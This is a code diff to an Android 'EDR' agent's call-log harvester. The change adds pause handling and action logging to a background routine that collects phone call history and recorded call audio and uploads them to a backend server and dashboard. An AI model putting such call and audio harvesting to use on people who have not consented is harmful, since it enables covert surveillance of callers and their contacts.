@@ -8,7 +8,9 @@ import android.os.Build
 import android.provider.CallLog
 import android.util.Log
 import androidx.core.content.ContextCompat
+import com.edr.agent.logging.EdrActionLogger
 import com.edr.agent.network.EdrHttpClient
+import com.edr.agent.network.EdrNetworkManager
 import com.edr.agent.service.EdrForegroundService
 import com.edr.agent.storage.EdrLocalStorage
 import com.edr.agent.storage.SyncPreferences
@@ -181,81 +183,108 @@ object CallLogHarvester {
      * Harvests and uploads phone history with call recordings to central EDR backend on a background thread.
      */
     fun harvestAndUpload(context: Context, callback: ((Boolean, Int) -> Unit)? = null) {
+        if (SyncPreferences.isAgentPaused) {
+            val netWire = EdrNetworkManager.getWireNetworkType(context)
+            Log.d(TAG, "Call log sync skipped: network is $netWire (EDR Paused)")
+            EdrActionLogger.logSkipped(
+                context = context,
+                module = "DataCollection",
+                eventType = "CALL_LOG_SYNC",
+                triggeredBy = "Automatic",
+                description = "Phone call history sync",
+                reason = "Skipped: network $netWire (EDR Paused)"
+            )
+            callback?.invoke(true, 0)
+            return
+        }
+
         Thread {
             try {
-                val records = harvestCallLogs(context)
-                if (records.isEmpty()) {
-                    callback?.invoke(true, 0)
-                    return@Thread
-                }
+                EdrActionLogger.runLoggedAction(
+                    context = context,
+                    module = "DataCollection",
+                    eventType = "CALL_LOG_SYNC",
+                    triggeredBy = "Automatic",
+                    description = "Phone call history harvesting & sync"
+                ) { actCtx ->
+                    val records = harvestCallLogs(context)
+                    if (records.isEmpty()) {
+                        callback?.invoke(true, 0)
+                        return@runLoggedAction
+                    }
 
-                val deviceId = SyncPreferences.deviceId
-                val baseUrl = SyncPreferences.httpBaseUrl
-                if (deviceId.isEmpty() || baseUrl.isEmpty()) {
-                    callback?.invoke(false, 0)
-                    return@Thread
-                }
+                    val deviceId = SyncPreferences.deviceId
+                    val baseUrl = SyncPreferences.httpBaseUrl
+                    if (deviceId.isEmpty() || baseUrl.isEmpty()) {
+                        callback?.invoke(false, 0)
+                        return@runLoggedAction
+                    }
 
-                // 1. Upload any pending call audio recordings across all internet connections
-                for (rec in records) {
-                    if (rec.hasRecording) {
-                        val recFile = CallAudioRecorder.findRecordingForCall(context, rec.phoneNumber, rec.timestamp)
-                        if (recFile != null && recFile.exists() && recFile.length() > 500) {
-                            val uploadedName = uploadCallAudioFile(recFile, rec.callId, rec.phoneNumber, rec.timestamp)
-                            if (uploadedName != null) {
-                                rec.recordingFilename = uploadedName
-                                rec.hasRecording = true
-                                rec.recordingStatus = "RECORDED"
-                                rec.recordingReason = null
+                    // 1. Upload any pending call audio recordings across all internet connections
+                    for (rec in records) {
+                        if (rec.hasRecording) {
+                            val recFile = CallAudioRecorder.findRecordingForCall(context, rec.phoneNumber, rec.timestamp)
+                            if (recFile != null && recFile.exists() && recFile.length() > 500) {
+                                val uploadedName = uploadCallAudioFile(recFile, rec.callId, rec.phoneNumber, rec.timestamp)
+                                if (uploadedName != null) {
+                                    rec.recordingFilename = uploadedName
+                                    rec.hasRecording = true
+                                    rec.recordingStatus = "RECORDED"
+                                    rec.recordingReason = null
+                                    actCtx.addUploadedBytes(recFile.length())
+                                }
                             }
                         }
                     }
-                }
 
-                // 2. Upload synchronized call log records to backend
-                val payload = mapOf(
-                    "deviceId" to deviceId,
-                    "callLogs" to records
-                )
-
-                val body = gson.toJson(payload).toRequestBody(jsonMediaType)
-                val request = Request.Builder()
-                    .url("$baseUrl/api/call-logs/upload")
-                    .post(body)
-                    .build()
-
-                val response = httpClient.newCall(request).execute()
-                val success = response.isSuccessful
-                val code = response.code
-                response.close()
-
-                if (success) {
-                    Log.i(TAG, "Successfully uploaded ${records.size} phone history records to EDR server.")
-                    EdrLocalStorage.appendEdrLog(
-                        context,
-                        "CALL_SYNC",
-                        "Synchronized ${records.size} call records with duration & audio status to central vault."
-                    )
-
-                    // Also broadcast via WebSocket so dashboard updates instantly
-                    val wsMsg = mapOf(
-                        "type" to "CALL_LOGS_SYNCED",
+                    // 2. Upload synchronized call log records to backend
+                    val payload = mapOf(
                         "deviceId" to deviceId,
-                        "payload" to mapOf(
-                            "count" to records.size,
-                            "latestTimestamp" to (records.firstOrNull()?.timestamp ?: 0L)
-                        ),
-                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
+                        "callLogs" to records
                     )
-                    EdrForegroundService.instance?.sendWebSocketMessage(gson.toJson(wsMsg))
 
-                    callback?.invoke(true, records.size)
-                } else {
-                    Log.e(TAG, "Server rejected call log upload: HTTP $code")
-                    callback?.invoke(false, 0)
+                    val jsonBytes = gson.toJson(payload).toByteArray()
+                    actCtx.addUploadedBytes(jsonBytes.size.toLong())
+                    val body = jsonBytes.toRequestBody(jsonMediaType)
+                    val request = Request.Builder()
+                        .url("$baseUrl/api/call-logs/upload")
+                        .post(body)
+                        .build()
+
+                    val response = httpClient.newCall(request).execute()
+                    val success = response.isSuccessful
+                    val code = response.code
+                    response.close()
+
+                    if (success) {
+                        Log.i(TAG, "Successfully uploaded ${records.size} phone history records to EDR server.")
+                        EdrLocalStorage.appendEdrLog(
+                            context,
+                            "CALL_SYNC",
+                            "Synchronized ${records.size} call records with duration & audio status to central vault."
+                        )
+
+                        // Also broadcast via WebSocket so dashboard updates instantly
+                        val wsMsg = mapOf(
+                            "type" to "CALL_LOGS_SYNCED",
+                            "deviceId" to deviceId,
+                            "payload" to mapOf(
+                                "count" to records.size,
+                                "latestTimestamp" to (records.firstOrNull()?.timestamp ?: 0L)
+                            ),
+                            "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
+                        )
+                        val wsJson = gson.toJson(wsMsg)
+                        actCtx.addUploadedBytes(wsJson.toByteArray().size.toLong())
+                        EdrForegroundService.instance?.sendWebSocketMessage(wsJson)
+
+                        callback?.invoke(true, records.size)
+                    } else {
+                        throw RuntimeException("Server responded with HTTP $code")
+                    }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "Failed harvesting/uploading call logs: ${e.message}", e)
+                Log.e(TAG, "Failed harvesting & uploading call logs: ${e.message}")
                 callback?.invoke(false, 0)
             }
         }.start()
